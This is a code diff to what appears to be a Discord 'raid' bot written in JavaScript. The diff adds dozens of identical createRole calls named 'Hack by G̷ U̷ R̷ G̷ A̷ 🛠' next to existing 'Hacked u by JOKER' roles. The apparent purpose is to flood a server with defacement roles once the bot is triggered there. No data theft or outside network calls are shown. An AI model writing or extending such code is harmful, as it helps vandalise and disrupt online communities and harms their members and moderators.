@@ -85,6 +85,136 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
     m.createRole({
         name : "Hacked u by JOKER",
         permissions :   [1],
@@ -239,6 +369,11 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
     m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
         name : "Hacked u by JOKER",
         permissions :   [1],
         color : " #ff0000"
@@ -271,7 +406,7 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by JOKER",
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
